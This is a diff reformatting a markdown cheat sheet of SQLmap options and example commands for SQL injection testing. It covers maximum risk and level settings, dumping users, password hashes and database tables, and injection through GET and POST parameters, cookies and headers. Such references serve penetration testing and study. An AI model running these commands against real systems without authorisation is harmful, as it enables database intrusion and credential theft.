@@ -4,57 +4,57 @@
 
 ## Basic arguments for SQLmap
 Generic ->
--  -u " < URL > " 
--  -p "<PARAM TO TEST>" 
--  --user-agent=SQLMAP 
--  --random-agent 
---threads=10 
---risk=3 #MAX
---level=5 #MAX
---dbms="<KNOWN DB TECH>" 
---os="<OS>"
---technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
---batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
---auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
---auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
---proxy=http://127.0.0.1:8080
---union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
+-   -u " < URL > " 
+-   -p "<PARAM TO TEST>" 
+-   --user-agent=SQLMAP 
+-   --random-agent 
+-   --threads=10 
+-   --risk=3 #MAX
+-   --level=5 #MAX
+-   --dbms="<KNOWN DB TECH>" 
+-   --os="<OS>"
+-   --technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+-   --batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+-   --auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+-   --auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+-   --proxy=http://127.0.0.1:8080
+-   --union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
 
 ## Retrieve Information
 Internal
---current-user #Get current user
---is-dba #Check if current user is Admin
---hostname #Get hostname
---users #Get usernames od DB
---passwords #Get passwords of users in DB
---privileges #Get privileges
+-   --current-user #Get current user
+-   --is-dba #Check if current user is Admin
+-   --hostname #Get hostname
+-   --users #Get usernames od DB
+-   --passwords #Get passwords of users in DB
+-   --privileges #Get privileges
 
 
-DB data
---all #Retrieve everything
---dump #Dump DBMS database table entries
---dbs #Names of the available databases
---tables #Tables of a database ( -D <DB NAME> )
---columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
--D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
+##DB data
+-   --all #Retrieve everything
+-   --dump #Dump DBMS database table entries
+-   --dbs #Names of the available databases
+-   --tables #Tables of a database ( -D <DB NAME> )
+-   --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+-   -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
 
 
-Injection place
-From BurpSuite/ZAP capture
-Capture the request and create a req.txt file!
-[sqlmap -r req.txt --current-user]
+##Injection place
+-   From BurpSuite/ZAP capture
+-   Capture the request and create a req.txt file!
+-   [sqlmap -r req.txt --current-user]
 
-GET Request Injection
-sqlmap -u "http://example.com/?id=1" -p id
-sqlmap -u "http://example.com/?id=*" -p id
+##GET Request Injection
+-   sqlmap -u "http://example.com/?id=1" -p id
+-   sqlmap -u "http://example.com/?id=*" -p id
 
-POST Request Injection
-sqlmap -u "http://example.com" --data "username=*&password=*"
+##POST Request Injection
+-   sqlmap -u "http://example.com" --data "username=*&password=*"
 
 
-Injections in Headers and other HTTP Methods
-#Inside cookie
-sqlmap  -u "http://example.com" --cookie "mycookies=*"
+##Injections in Headers and other HTTP Methods
+# Inside cookie
+-   sqlmap  -u "http://example.com" --cookie "mycookies=*"
 
 #Inside some header
 sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
